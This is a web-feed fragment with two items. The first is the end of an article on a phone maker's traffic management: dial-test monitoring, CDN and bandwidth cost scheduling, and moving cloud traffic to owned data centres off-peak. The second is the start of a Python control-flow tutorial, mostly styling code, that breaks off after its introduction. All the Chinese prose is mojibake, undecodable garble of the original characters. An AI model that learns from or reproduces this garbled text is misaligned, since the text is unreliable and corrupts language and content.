<p>æœ€åæ˜¯<strong>ä¸šåŠ¡ä»·å€¼</strong>ï¼šé€šè¿‡è¿™å¥—ç³»ç»Ÿï¼Œæˆ‘ä»¬ä¸ºåº”ç”¨å•†åº—ç­‰ä¸šåŠ¡ï¼Œå¸¦æ¥äº†æ•´ä½“ä¸‹è½½é€Ÿåº¦æå‡è¶…è¿‡2%ï¼</p>
</li>
<li>
<p>**æ›´å…³é”®çš„æ˜¯ï¼Œ**å®ƒä¸ºæˆ‘ä»¬çš„å•†ä¸šåŒ–å¸¦æ¥äº†è¶…è¿‡åƒä¸‡å…ƒçš„æ”¶å…¥æå‡ï¼è¿™å°±æ˜¯æŠ€æœ¯é©±åŠ¨ä¸šåŠ¡å¢é•¿æœ€ç›´æ¥ä½“ç°ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e96ada5dabc94d70ad93ebf17ae57468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=9I%2BEj0qGc7nRSGfFN9QRUjMKeHo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-14">3.2.4 å…¬ç½‘å¸¦å®½æ²»ç†</h4>
<p>è®²å®Œäº†CDNï¼Œæˆ‘ä»¬å†æ¥çœ‹å¦ä¸€ä¸ªæˆæœ¬å¤§å¤´ï¼šæœºæˆ¿å…¬ç½‘å¸¦å®½ã€‚ ä»è¿™å¼ å…¨ç½‘å…¬ç½‘å¸¦å®½çš„è¶‹åŠ¿å›¾ã€‚å¯ä»¥çœ‹åˆ°ï¼Œåœ¨2022å¹´ä¹‹å‰ï¼Œæˆ‘ä»¬çš„å¸¦å®½å¢å¹…æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œæˆæœ¬å‹åŠ›ä¹Ÿéšä¹‹è€Œæ¥ã€‚</p>
<p>ä½†æ˜¯ï¼Œä»2023å¹´å¼€å§‹ï¼Œå¢å¹…æ˜æ˜¾è¶‹äºå¹³ç¨³ã€‚ è¿™ä¸æ˜¯å› ä¸ºä¸šåŠ¡åœæ»äº†ï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä»¬è¿›è¡Œäº†ä¸€ç³»åˆ—æŒç»­çš„æˆæœ¬æ²»ç†å’Œè¿è¥ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬é‡ç‚¹é’ˆå¯¹ä¸»åŠ¨ä¸Šç½‘ã€åŸ‹ç‚¹ä¸šåŠ¡å’Œå‡ºå…¥å‘å‡è¡¡è¿›è¡Œäº†ä¸“é¡¹ä¼˜åŒ–ï¼ŒæˆåŠŸåœ°å°†å¸¦å®½å¢é•¿æ§åˆ¶åœ¨äº†å¯é¢„æœŸçš„èŒƒå›´å†…ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘å°±ä¸ºå¤§å®¶ä»‹ç»ä¸€ä¸‹æˆ‘ä»¬å®ç°è¿™ä¸ªç›®æ ‡çš„å…³é”®èƒ½åŠ›ã€‚ è¦å®ç°å…¬ç½‘å¸¦å®½é™æœ¬ï¼Œæˆ‘ä»¬åŒæ ·æ‰“é€ äº†ä¸€å¥—å…¬ç½‘å¸¦å®½è°ƒåº¦ä½“ç³»ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/465b3896e3bc44c5a06565d70ec75af2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Te9kFJOc8gGMM9QfgtTtQu9FzyU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å¥—ä½“ç³»ä¸»è¦åŒ…å«äº†å‡ ä¸ªæ ¸å¿ƒèƒ½åŠ›ï¼š</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œæ˜¯IDCæœºæˆ¿å¸¦å®½çš„æ™ºèƒ½è°ƒåº¦ï¼Œè¿™æ˜¯æˆ‘ä»¬è¿›è¡Œæµé‡è…¾æŒªçš„åŸºç¡€ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œæ˜¯å¸¦å®½ç”¨é‡çš„å½’å› åˆ†æå’Œæˆæœ¬åˆ†æ‘Šï¼Œè®©æˆ‘ä»¬æ¸…æ¥šæ¯ä¸€åˆ†å¼€é”€èŠ±åœ¨äº†å“ªé‡Œã€‚</p>
</li>
<li>
<p>æœ€åï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæ˜¯åŸºäºæ‹¨æµ‹æ•°æ®çš„è´¨é‡è°ƒåº¦å’Œç›‘æ§ï¼Œç¡®ä¿æˆ‘ä»¬åœ¨ä¼˜åŒ–æˆæœ¬çš„åŒæ—¶ï¼Œä¸ç‰ºç‰²ç”¨æˆ·ä½“éªŒã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6194aa63378046239e79b039661a8da8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ya8rqzU6FU76odY4fDsjd9AcQ4Y%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚ä¸‹äº§å“æ¶æ„å›¾ï¼Œå±•ç¤ºäº†æˆ‘ä»¬å…¨çƒæ··åˆäº‘ç¯å¢ƒä¸‹ï¼Œå…¬ç½‘å¸¦å®½è°ƒåº¦çš„å…¨è²Œã€‚ å½“ä¸€ä¸ªvivoçš„å…¨çƒç”¨æˆ·å‘èµ·è®¿é—®æ—¶ï¼Œæˆ‘ä»¬çš„æ™ºèƒ½è§£æç³»ç»Ÿ(VHS)ï¼Œä¼šæˆä¸ºç¬¬ä¸€ä¸ªå†³ç­–å…¥å£ã€‚</p>
<p>å®ƒä¼šç»“åˆæ¥è‡ªæˆ‘ä»¬å…¨çƒæ‹¨æµ‹ç‚¹çš„æºç«™è´¨é‡ç›‘æµ‹æ•°æ®ï¼Œä»¥åŠæˆ‘ä»¬VIPåœ°å€æ± çš„ç®¡ç†ç­–ç•¥ï¼Œæ™ºèƒ½åœ°åˆ¤æ–­ï¼Œåº”è¯¥æŠŠè¿™ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼Œè§£æåˆ°å“ªä¸ªåœ°åŸŸçš„å“ªä¸ªæœºæˆ¿ã€‚</p>
<p>è¿™ä¸ªæœºæˆ¿ï¼Œå¯èƒ½æ˜¯æˆ‘ä»¬åœ¨åŒ—äº¬çš„è‡ªå»ºIDCï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘ä»¬åœ¨æ–°åŠ å¡ã€å¾·å›½çš„ç«å±±äº‘æˆ–è°·æ­Œäº‘ã€‚</p>
<p>æ•´ä¸ªå†³ç­–è¿‡ç¨‹ï¼Œéƒ½ä¼šåœ¨æˆ‘ä»¬çš„ç»Ÿä¸€æ§åˆ¶å°ä¸Šè¿›è¡Œå¯è§†åŒ–çš„ç®¡ç†å’Œå¹²é¢„ï¼ŒåŒ…æ‹¬æˆæœ¬è°ƒåº¦ã€è´¨é‡è°ƒåº¦ã€æ•…éšœåˆ†æç­‰ç­‰ã€‚é€šè¿‡è¿™å¥—æ¶æ„ï¼Œæˆ‘ä»¬å®ç°äº†å¯¹å…¨çƒæµé‡çš„â€œå®è§‚è°ƒæ§â€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c03a39272a074497bbac3ac7b7631010~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=ghIQcy9RKmRvYiUHGAOgnV8ZoVU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åœ¨ä¼—å¤šè°ƒåº¦ç­–ç•¥ä¸­ï¼Œæœ‰ä¸€ä¸ªéå¸¸æœ‰æ•ˆçš„æˆæœ¬è°ƒåº¦ç­–ç•¥ï¼Œå°±æ˜¯â€œå…¬æœ‰äº‘è°ƒåº¦è‡ªå»ºæœºæˆ¿â€ã€‚</p>
<p>å®ƒçš„æ ¸å¿ƒåŸç†ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨äº†ä¸åŒèµ„æºçš„è®¡è´¹æ¨¡å‹å·®å¼‚ã€‚å¤§å®¶çŸ¥é“ï¼Œå…¬æœ‰äº‘æ˜¯æŒ‰æµé‡è®¡è´¹ï¼Œç”¨å¤šå°‘ç®—å¤šå°‘ï¼›è€Œæˆ‘ä»¬çš„è‡ªå»ºIDCï¼Œæ˜¯æŒ‰å¸¦å®½å³°å€¼è®¡FÃ¨iï¼Œå°±åƒåŒ…æœˆå¥—é¤ã€‚</p>
<p>é‚£ä¹ˆï¼Œè¿™é‡Œå°±æœ‰äº†ä¸€ä¸ªå·¨å¤§çš„ä¼˜åŒ–ç©ºé—´ã€‚å¤§å®¶çœ‹è¿™å¼ å›¾ï¼Œæˆ‘ä»¬çš„ç›‘æ§ç³»ç»Ÿä¼šå®æ—¶é‡‡é›†è‡ªå»ºIDCçš„å¸¦å®½ç”¨é‡ã€‚å½“å‘ç°IDCå¤„äºå¸¦å®½ä½è°·æ—¶ï¼Œæ¯”å¦‚å‡Œæ™¨ï¼Œæµé‡å¾ˆå°‘ï¼Œå¸¦å®½å¤§é‡é—²ç½®ï¼Œéå¸¸æµªè´¹ã€‚</p>
<p>è¿™æ—¶ï¼Œæˆ‘ä»¬çš„è°ƒåº¦å†³ç­–ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨æ‰§è¡Œåˆ‡æ¢ï¼Œé€šè¿‡DNSè§£ææˆ–è€…CDNæºç«™å˜æ›´ï¼ŒæŠŠä¸€éƒ¨åˆ†åŸæœ¬è·‘åœ¨å…¬æœ‰äº‘ä¸Šçš„æµé‡ï¼Œè°ƒåº¦åˆ°æˆ‘ä»¬é—²ç½®çš„è‡ªå»ºIDCä¸Šæ¥ã€‚</p>
<p>è¿™ä¸ªâ€œå‰Šå³°å¡«è°·â€çš„åŠ¨ä½œï¼Œæ•ˆæœéå¸¸æ˜¾è‘—ï¼šå…¬æœ‰äº‘è°ƒåº¦åˆ°IDCçš„æµé‡å æ¯”è¶…è¿‡äº†60%ï¼Œæ¯å¹´ä¸ºæˆ‘ä»¬èŠ‚çœäº†æ•°ç™¾ä¸‡çš„æµé‡æˆæœ¬ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b372579b19cd43b29bf75923de6a9d10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=OJqVHFvPo4H9MHVT7kcVimHnkno%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-15">å››ã€æ€»ç»“ä¸å±•æœ›</h2>
<p>é€šè¿‡â€œæ‹¨æµ‹ç›‘æ§â€å’Œâ€œèåˆæµé‡ç®¡ç†å¹³å°â€çš„è¿™ä¸€ç³»åˆ—å®è·µï¼Œæˆ‘ä»¬å–å¾—äº†å“ªäº›æ˜¾è‘—çš„æˆæ•ˆå‘¢ï¼Ÿ</p>
<ul>
<li>
<p>é¦–å…ˆï¼Œåœ¨<strong>ç»Ÿä¸€çº³ç®¡</strong>ä¸Šï¼Œæˆ‘ä»¬å±è”½äº†åº•å±‚ä¾›åº”å•†çš„å·®å¼‚ï¼Œå¯¹å¤–æä¾›äº†ä¸€è‡´çš„æ¥å£èƒ½åŠ›ï¼Œå¤§å¤§æå‡äº†è¿ç»´æ•ˆç‡ã€‚</p>
</li>
<li>
<p>å…¶æ¬¡ï¼Œåœ¨<strong>æå‡è´¨é‡</strong>ä¸Šï¼Œæˆ‘ä»¬ä¸ºæ ¸å¿ƒä¸šåŠ¡ï¼Œæ¯”å¦‚åº”ç”¨å•†åº—ï¼Œå¸¦æ¥äº†æ•´ä½“ä¸‹è½½é€Ÿåº¦è¶…è¿‡2%çš„æå‡ï¼Œè¿™å¯¹ç”¨æˆ·ä½“éªŒæ˜¯å®å®åœ¨åœ¨çš„æ”¹å–„ã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰ï¼Œåœ¨<strong>é™ä½æˆæœ¬</strong>ä¸Šï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ç³»åˆ—æ™ºèƒ½è°ƒåº¦æ‰‹æ®µï¼Œå®ç°äº†CDNå’Œå…¬ç½‘å¸¦å®½çš„åƒä¸‡çº§é™æœ¬ï¼Œè¿™æ˜¯éå¸¸å¯è§‚çš„ç»æµæ•ˆç›Šã€‚</p>
</li>
<li>
<p>æœ€åï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼Œæˆ‘ä»¬å®ç°äº†<strong>è¥æ”¶å¢æ•ˆ</strong>ï¼è´¨é‡çš„æå‡å’Œæˆæœ¬çš„ä¼˜åŒ–ï¼Œæœ€ç»ˆè½¬åŒ–ä¸ºäº†å•†ä¸šåŒ–è¿è¥æ”¶å…¥çš„æ˜¾è‘—æå‡ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7274fdc6a76a4815ad4c6a1fa7655bbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=Xfk2JnRCfAnFzYIt27g%2BPJbkSCs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„æ¢ç´¢å’Œå®è·µè¿˜åœ¨è·¯ä¸Šï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦æœ‰ä¸‰ä¸ª<strong>å‘å±•æ–¹å‘</strong>ï¼š</p>
<ul>
<li>
<p>ç¬¬ä¸€ï¼Œæ˜¯<strong>AIé©±åŠ¨çš„æ·±åº¦ä¼˜åŒ–</strong>ã€‚æˆ‘ä»¬å°†å¼•å…¥æ›´å¼ºå¤§çš„AIèƒ½åŠ›ï¼Œå»å®ç°æ›´ç²¾å‡†çš„æµé‡é¢„æµ‹å’Œæ›´æ™ºèƒ½çš„å¼‚å¸¸è‡ªæ„ˆã€‚</p>
</li>
<li>
<p>ç¬¬äºŒï¼Œæ˜¯<strong>å¤šäº‘/æ··åˆäº‘æµé‡ç®¡ç†çš„æŒç»­æ·±åŒ–</strong>ã€‚æˆ‘ä»¬ä¼šå°†å½“å‰çš„æˆåŠŸç»éªŒï¼Œæ‰©å±•åˆ°æ›´å¹¿é˜”çš„æµ·å¤–å¸‚åœºï¼Œä¸ºå…¬å¸å…¨çƒåŒ–çš„å‡ºæµ·ä¸šåŠ¡ä¿é©¾æŠ¤èˆªã€‚</p>
</li>
<li>
<p>ç¬¬ä¸‰ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è®¤ä¸ºæå…·ä»·å€¼çš„ä¸€ç‚¹ï¼Œæ˜¯<strong>æ‰“é€šç½‘ç»œè´¨é‡å’Œä¸šåŠ¡æŒ‡æ ‡çš„å…³è”</strong>ã€‚æˆ‘ä»¬è¦å»ºç«‹èµ·ä¸šåŠ¡å¢é•¿å’Œç½‘ç»œæŒ‡æ ‡çš„å…³è”åˆ†æèƒ½åŠ›ï¼Œç”¨æ•°æ®è¯æ˜æ¯ä¸€æ¬¡ç½‘ç»œä¼˜åŒ–ï¼Œæ˜¯å¦‚ä½•å®å®åœ¨åœ¨åœ°ä¸ºä¸šåŠ¡æ”¶å…¥å¢é•¿èµ‹èƒ½çš„ï¼</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cffe2b43ba24c1aafa7532b57d03003~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdml2b-S6kuiBlOe9keaKgOacrw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768445274&amp;x-signature=NnK%2FwwXIN2LmuwtWVzeM%2BpqawYo%3D" alt="å›¾ç‰‡" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰]]></title>    <link>https://juejin.cn/post/7592431064976932879</link>    <guid>https://juejin.cn/post/7592431064976932879</guid>    <pubDate>2026-01-07T14:30:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592431064976932879" data-draft-id="7592440247956455439" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-07T14:30:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="love_summer"/> <meta itemprop="url" content="https://juejin.cn/user/1462819851084228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£Pythonæµç¨‹æ§åˆ¶ï¼šä»ç®—æ³•è®¾è®¡åˆ°é¡ºåºæ‰§è¡Œæœºåˆ¶ï¼ˆé™„ä»£ç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1462819851084228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    love_summer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:30:18.000Z" title="Wed Jan 07 2026 14:30:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><blockquote>
<p><strong>å¼•è¨€</strong><br/>
æ‰€è°“çš„ç¼–ç¨‹ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹<strong>æ§åˆ¶æµ</strong>çš„é©¾é©­ã€‚æ— è®ºç®—æ³•å¤šä¹ˆå¤æ‚ï¼Œæœ€ç»ˆéƒ½è¦è½¬åŒ–ä¸ºæœºå™¨å¯æ‰§è¡Œçš„çº¿æ€§æŒ‡ä»¤ã€‚ä»Šå¤©æˆ‘ä»¬é‡è¯»ã€Šè·Ÿç€å¨Ÿå­å§å­¦Pythonã€‹ç¬¬4ç« ï¼ŒèŠèŠç¨‹åºæè¿°çš„å·¥ç¨‹ä»·å€¼ï¼Œä»¥åŠPythonä¸­æœ€åŸºç¡€çš„é¡ºåºç»“æ„èƒŒåé‚£äº›ä¼˜é›…çš„è®¾è®¡ã€‚</p>
</blockquote>
<h3 data-id="heading-0">ä¸€ã€ç®—æ³•çš„å¯è§†åŒ–ï¼šç¨‹åºçš„æè¿°æ–¹å¼</h3>
